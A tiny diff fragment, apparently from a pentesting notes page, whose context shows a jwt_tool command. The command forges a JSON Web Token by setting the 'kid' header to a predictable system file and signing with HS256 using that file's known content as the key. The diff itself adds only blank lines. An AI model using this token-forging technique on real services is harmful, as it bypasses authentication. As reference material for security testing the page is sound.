@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:22:34.479056+00:00'
 ```bash
 python3 jwt_tool.py <JWT> -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
 ```
+
+
